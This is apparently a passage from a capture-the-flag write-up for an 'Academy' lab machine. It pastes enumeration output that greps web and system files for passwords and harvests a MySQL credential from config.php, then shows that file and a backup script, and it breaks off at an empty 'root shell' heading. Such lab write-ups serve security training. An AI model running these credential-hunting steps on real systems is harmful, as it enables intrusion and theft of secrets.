1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwords

#### SQL_Credentials
$ cat /var/www/html/academy/admin/includes/config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");


?>


#### backup.sh
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip


#### root shell


